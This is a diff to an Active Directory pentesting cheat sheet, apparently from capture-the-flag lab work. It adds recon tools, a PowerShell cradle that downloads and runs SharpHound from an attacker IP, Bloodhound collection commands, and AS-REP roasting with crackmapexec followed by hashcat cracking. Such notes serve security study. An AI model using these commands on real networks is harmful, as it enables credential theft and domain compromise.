@@ -1,6 +1,6 @@
 # Intro
 * Sources for this cheat sheet: [zer1t0](https://zer1t0.gitlab.io/posts/attacking_ad/)
-* If not stated otherwise, all commands are to be executed in Powershell
+* Good list of AD pentest commands and tools: https://wadcoms.github.io/
 
 # Reconaissance
 
@@ -8,8 +8,10 @@ Understanding the target AD environment is key to further exploitation.
 
 * **Tools**:
 
-AD recon: https://github.com/sense-of-security/ADRecon
-Bloodhound: https://github.com/BloodHoundAD/BloodHound
+* Most important tool: `enum4linux`
+* AD recon: https://github.com/sense-of-security/ADRecon
+* Bloodhound: https://github.com/BloodHoundAD/BloodHound
+* targetedKerberoast: https://github.com/ShutdownRepo/targetedKerberoast
 
 
 ## Domain Controller Discovery
@@ -24,9 +26,48 @@ Bloodhound: https://github.com/BloodHoundAD/BloodHound
 * NTLM info scirpt: `ntlm-info smb 192.168.100.0/24`
 * Scan also for ports: 135(RPC) and 139(NetBIOS serssion service)
 
-# Foothold
+## Sniffing using Bloodhound
 
-After finding the hosts, you need to connect to them.
+Actual collectors: https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
+
+1. Get Sharphound on target host to collect data for Bloodhound
+`iex(new-object net.webclient).downloadstring("http://10.10.14.43/SharpHound.ps1")`
+
+2. Invoke Bloodhound on target host and harvest data
+`invoke-bloodhound -collectionmethod all -ZipFileName exf_blood -domain xxx.local -ldapuser xxxuserxxx -ldappass xxpasswordxxx`
+
+OR
+
+use Bloodhound.py (https://github.com/fox-it/BloodHound.py) to collect AD info:
+
+`./bloodhound.py -d xxx.local -uxxx-xxx -p xxx -gc xxx.xxx.local -c all -ns 10.10.10.xxx`
+
+# Exploitation
+
+## Brute Force
+
+* Itnitial exploitation can be attempted by trying to apply random exploits to the target using impacket
+* To get user list of users use: `enum4linux`
+
+```
+
+   1. Look for vulnerable users via LDAP
+      
+   2. Use ASREP roast against users in the ldapenum_asrep_users.txt file
+    
+   crackmapexec ldap forest -u users1.txt  -p '' --asreproast ASREProast --kdcHost 10.10.10.161
+   
+   3. Use SPN roast against users in the ldapenum_spn_users.txt file
+   
+   Crack SPN roast and ASPREP roast output with hashcat
+   
+   hashcat -a 0 -m 18200 hc.txt  /usr/share/wordlists/rockyou.txt
+
+```
+
+
+
+
 
 ## Connection
 
